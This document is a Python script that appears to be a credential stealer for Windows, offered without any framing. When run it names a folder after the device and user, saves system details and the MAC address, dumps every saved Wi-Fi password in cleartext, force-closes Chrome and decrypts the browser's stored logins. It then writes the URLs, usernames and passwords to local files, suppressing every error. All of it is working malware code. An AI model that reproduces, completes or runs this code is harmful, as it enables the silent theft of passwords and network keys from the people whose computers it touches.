from rx7 import write,call_later,record
time=record()
import pkg_resources.py2_warn
import os,subprocess,re,platform,uuid,sys
#from pyautogui import hotkey
#hotkey('win','down')

Device_Name= platform.node()+' - '+os.getlogin()

def ADD_DEVICE():
    try:    os.mkdir('F')
    except: pass
    Device_Name= platform.node()+' - '+os.getlogin()
    try:    os.mkdir('.\\F\\' + Device_Name)
    except: pass
ADD_DEVICE()

WIFIS=set(list(x[2:] for x in re.findall(r': .*', subprocess.getoutput('netsh wlan show profiles'))))

def SysINFO():
    try:
        write(f'.\\F\\{Device_Name}\\Info',mode='replace',text=f'SI:\n{platform.uname()}\nMac: {hex(uuid.getnode())}\n\nWIFI:\n{WIFIS}')
    except:
        pass
SysINFO()

def WFPS():
    try:
        dic={}
        for wifi in WIFIS:
            a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
            try:
                new=re.search(r'Key Content.*',a)
                new=new.group()
                new= new[new.index(':')+2:]
                dic[wifi]=new
                sys.stdout.write(f"\rDone.  ({len(dic)})")
                #sys.stdout.flush()
            except:
                dic[wifi]='None'     
        if len(dic):
            write(f'.\\F\\{Device_Name}\\WF PS',str(dic))
        else:
            pass
    except:pass
WFPS()

def CP():
    import sqlite3,win32crypt
    try:
        subprocess.getoutput('taskkill /f /im "chrome.exe"')
        # <db connect and query>
        c = sqlite3.connect(os.path.join(os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default", 'Login Data'))
        cursor = c.cursor()
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        except:
            pass
        # <URL: credentials dictionary>
        credential = {}
        y=0
        # <decrytping the password>
        for url, user_name, pwd, in cursor.fetchall():
            try:
                # <This returns a tuple description and the password>
                pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
                credential[url] = (user_name, pwd[1])
                sys.stdout.write(f"\rDone.  ({str(len(credential))})")
            except:
                y+=1
        #print(len(credential))
        #print(y)
        # <writing to a text file (CAUTION: Don't leave this text file around!)>
        if len(credential):
            with open(f'.\\F\\{Device_Name}\\CP', 'w') as f:
                for url, credentials in credential.items():
                    if credentials[1]:
                        f.write("\n"+str(url)+"\n"+str(credentials[0].encode('utf-8'))+ " | "+str(credentials[1])+"\n")
                    #else:
                    #    f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")
        else:pass
    except:pass
CP()

